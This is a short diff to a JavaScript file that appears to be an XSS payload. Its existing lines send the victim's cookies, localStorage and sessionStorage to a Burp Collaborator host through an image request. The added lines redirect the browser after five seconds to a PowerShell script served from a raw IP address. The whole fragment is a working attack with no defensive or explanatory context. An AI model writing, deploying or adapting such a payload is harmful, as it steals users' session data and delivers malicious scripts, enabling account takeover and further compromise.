@@ -6,3 +6,8 @@ var burpCollaboratorURL = "https://7owu0awxjuufi9vpi9dec8m58wen2fq4.oastify.com"
 new Image().src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(document.cookie) +
                   "&localStorage=" + encodeURIComponent(localStorageData) +
                   "&sessionStorage=" + encodeURIComponent(sessionStorageData);
+
+setTimeout(function() {
+    window.location.href = "http://13.203.103.154:8445/interactive.ps1";
+}, 5000);
+
